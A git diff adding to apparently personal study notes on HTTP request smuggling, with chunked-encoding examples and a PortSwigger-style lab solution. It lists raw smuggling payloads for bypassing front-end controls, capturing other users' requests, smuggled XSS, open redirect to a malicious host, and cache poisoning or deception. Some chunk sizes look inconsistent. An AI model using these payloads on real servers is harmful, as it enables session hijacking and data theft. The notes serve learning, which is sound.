@@ -3895,6 +3895,55 @@ LLM -> API: create_email_forwarding_rule('peter')
   Transfer-Encoding
   : chunked
   ```
+
+**Correct Example**
+- The presence of both Content-Length: 6 and Transfer-Encoding: chunked  should not be used together
+- In chunked transfer encoding, each chunk must be followed by a CRLF (\r\n), and the final chunk (with size 0)
+- How to calculate the chunk size
+  ```
+  POST / HTTP/1.1
+  Host: example.com
+  Transfer-Encoding: chunked
+
+  5\r\n
+  abcde\r\n
+  0\r\n
+  \r\n
+  ```
+- chunked encoding 
+  ```
+  POST / HTTP/1.1
+  Host: 0ab900770438e5d386d809af009d00d2.web-security-academy.net
+  Content-Type: application/x-www-form-urlencoded
+  Transfer-Encoding: chunked
+
+  3\r\n
+  abc\r\n
+  0\r\n
+  \r\n
+  ```
+- without chunked encoding  
+  ```
+  POST / HTTP/1.1
+  Host: 0ab900770438e5d386d809af009d00d2.web-security-academy.net
+  Content-Type: application/x-www-form-urlencoded
+  Content-Length: 3
+
+  abc
+  ```
+
+**Bad example**
+```
+Request
+content-Length: 6
+Transfer-Encoding: chunked
+
+0\r\n
+\r\n
+X
+
+Response: Communication timed out. (chunked size is 5)
+```
 **Methodology**
 - Pre-requiste
   - The front-end server forwards multiple requests to a back-end server, using the same network connection.
@@ -3917,6 +3966,82 @@ LLM -> API: create_email_forwarding_rule('peter')
   ![CL.TE different response vulnerabilities](img/CL.TE_different_response.png)
 - Confirming TE.CL vulnerabilities using differential responses
   ![TE.CL different response vulnerabilities](img/TE.CL_different_response.png)
+
+**Exploiting HTTP request smuggling vulnerabilities**
+- Bypass front-end security controls
+  - Exploit discrepancies between front-end and back-end servers to bypass security checks.
+    ```
+   Content-Length: 13
+   Transfer-Encoding: chunked
+
+   0\r\n\r\n
+   ```
+- Revealing front-end request rewriting
+  - Identify how the front-end server rewrites requests by sending conflicting headers.
+    ```
+    Content-Length: 4
+    Transfer-Encoding: chunked
+
+    8\r\n
+    GET / HTTP/1.1\r\n\r\n
+    ```
+- Bypassing client authentication
+  - Hijack the session of an authenticated user by smuggling requests that bypass authentication.
+    ```
+    Transfer-Encoding: chunked
+    Content-Length: 6
+
+    0\r\n\r\n
+    GET /restricted HTTP/1.1
+    ```
+- Capturing other users' requests
+  - Steal sensitive data by smuggling a request to capture another user's HTTP request.
+    ```
+    Transfer-Encoding: chunked
+    Content-Length: 8
+
+    5
+    GET / HTTP/1.1
+    0\r\n\r\n
+    ```
+- Exploit reflected XSS
+  - Inject malicious scripts by smuggling a payload that is reflected in the response to another user.
+    ```
+    Content-Length: 5
+    Transfer-Encoding: chunked
+
+    5
+    GET / HTTP/1.1<script>alert(1)</script>\r\n\r\n
+    ```
+- Turn an on-site redirect into an open redirect
+  - Manipulate the server’s response to redirect users to a malicious site by exploiting request smuggling.
+    ```
+    Content-Length: 4
+    Transfer-Encoding: chunked
+
+    0\r\n\r\n
+    GET /redirect?url=http://malicious.com HTTP/1.1
+    ```
+- Web cache poisoning
+  - Poison the web cache by smuggling a malicious request that gets stored and served to other users.
+    ```
+    Transfer-Encoding: chunked
+    Content-Length: 8
+
+    5
+    GET /cache HTTP/1.1
+    X-Cache-Control: public\r\n\r\n
+    ```
+- Web cache deception
+  - Trick the cache into storing sensitive content by smuggling a request with deceptive caching headers.
+    ```
+    Transfer-Encoding: chunked
+    Content-Length: 8
+
+    5
+    GET /private HTTP/1.1
+    X-Cache: store\r\n\r\n
+    ```
 
 **Mitigation**
 - Interpret HTTP headers consistently on front-end and back-end servers
@@ -4005,8 +4130,26 @@ LLM -> API: create_email_forwarding_rule('peter')
     GET /404 HTTP/1.1
     X-Ignore: X
     ```
- - Response: HTTP/1.1 404 Not Found
-- dd
+  - Response: HTTP/1.1 404 Not Found
+- HTTP request smuggling, confirming a **TE.CL vulnerability via differential responses**
+  - Info: This lab involves a front-end and back-end server, and the **back-end server doesn't support chunked encoding**. To solve the lab, smuggle a request to the back-end server, so that a subsequent request for / (the web root) triggers a 404 Not Found response.
+  - https://www.youtube.com/watch?v=QaouEvhHefk
+    ```
+    POST / HTTP/1.1
+    Host: 0a52005f043ce5d88696239d00270096.web-security-academy.net
+    Content-Type: application/x-www-form-urlencoded
+    Content-Length: 4
+    Transfer-Encoding: chunked
+
+    5e
+    POST /404 HTTP/1.1
+    Content-Type: application/x-www-form-urlencoded
+    Content-Length: 15
+
+    x=1
+    0\r\n
+    \r\n
+    ```
 - dd
 - dd
 - dd
